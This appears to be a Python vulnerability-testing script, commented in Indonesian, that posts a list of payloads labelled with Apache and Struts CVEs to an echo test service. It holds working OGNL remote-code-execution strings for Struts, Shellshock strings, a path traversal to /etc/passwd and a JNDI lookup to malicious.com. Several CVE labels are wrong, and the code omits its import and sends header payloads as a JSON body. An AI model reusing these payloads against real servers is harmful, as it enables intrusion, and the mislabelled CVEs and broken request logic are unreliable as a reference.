```python
# URL API yang akan diuji (gunakan URL dari situs legal untuk pengujian, misalnya Postman Echo)
url = "https://postman-echo.com/post"

# Header untuk permintaan
headers = {
    "Content-Type": "application/json"
}

# Daftar payload untuk menguji berbagai CVE pada Apache
cve_payloads = [
    {
        "cve": "CVE-2017-5638",
        "description": "Apache Struts Remote Code Execution",
        "payload": {
            "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                           "(#_memberAccess?(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS):"
                           "(#context.setMemberAccess(#dm)))."
                           "(#cmd='echo Vulnerable')."
                           "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                           "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                           "(#p=new java.lang.ProcessBuilder(#cmds))."
                           "(#p.redirectErrorStream(true)).(#process=#p.start())."
                           "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                           "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                           "(#ros.flush())}"
        }
    },
    {
        "cve": "CVE-2018-11776",
        "description": "Apache Struts Namespace Vulnerability",
        "payload": {
            "namespace": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                         "(#_memberAccess?(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS):"
                         "(#context.setMemberAccess(#dm)))."
                         "(#cmd='echo Vulnerable')."
                         "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                         "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                         "(#p=new java.lang.ProcessBuilder(#cmds))."
                         "(#p.redirectErrorStream(true)).(#process=#p.start())."
                         "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                         "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                         "(#ros.flush())}"
        }
    },
    {
        "cve": "CVE-2019-0211",
        "description": "Apache HTTP Server Privilege Escalation",
        "payload": {
            "username": "test",
            "password": "test"
        }
    },
    {
        "cve": "CVE-2017-9798",
        "description": "Optionsbleed",
        "payload": {
            "method": "OPTIONS",
            "url": "/"
        }
    },
    {
        "cve": "CVE-2021-41773",
        "description": "Path Traversal and File Disclosure",
        "payload": {
            "url": "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        }
    },
    {
        "cve": "CVE-2018-1312",
        "description": "Apache HTTP Server unauthenticated access",
        "payload": {
            "Authorization": "Basic dGVzdDp0ZXN0"  # base64 encoded 'test:test'
        }
    },
    {
        "cve": "CVE-2017-7679",
        "description": "mod_mime buffer overread",
        "payload": {
            "Content-Type": "() { :;}; echo Vulnerable"
        }
    },
    {
        "cve": "CVE-2019-0220",
        "description": "Apache HTTP Server HTTP/2 DoS",
        "payload": {
            "Content-Length": "-1"
        }
    },
    {
        "cve": "CVE-2018-11763",
        "description": "Apache Struts JRE injection",
        "payload": {
            "username": "${jndi:ldap://malicious.com/a}",
            "password": "password"
        }
    },
    {
        "cve": "CVE-2014-6271",
        "description": "Shellshock Bash Vulnerability",
        "payload": {
            "User-Agent": "() { :;}; echo Vulnerable"
        }
    }
]

# Fungsi untuk mengirimkan permintaan HTTP dengan berbagai metode dan payload
def send_request(url, headers, method='POST', payload=None):
    if method == 'POST':
        response = requests.post(url, headers=headers, json=payload)
    elif method == 'OPTIONS':
        response = requests.options(url, headers=headers)
    elif method == 'GET':
        response = requests.get(url, headers=headers, params=payload)
    else:
        response = requests.post(url, headers=headers, json=payload)
    return response

# Menguji setiap payload CVE
for i, cve_test in enumerate(cve_payloads):
    cve = cve_test["cve"]
    description = cve_test["description"]
    payload = cve_test["payload"]
    method = payload.pop("method", 'POST')

    # Mengirimkan permintaan HTTP
    response = send_request(url, headers, method, payload)

    # Mencetak hasil
    print(f"Test {i+1}: CVE-{cve}")
    print("Description:", description)
    print("Payload:", payload)
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)
    print("------")
```
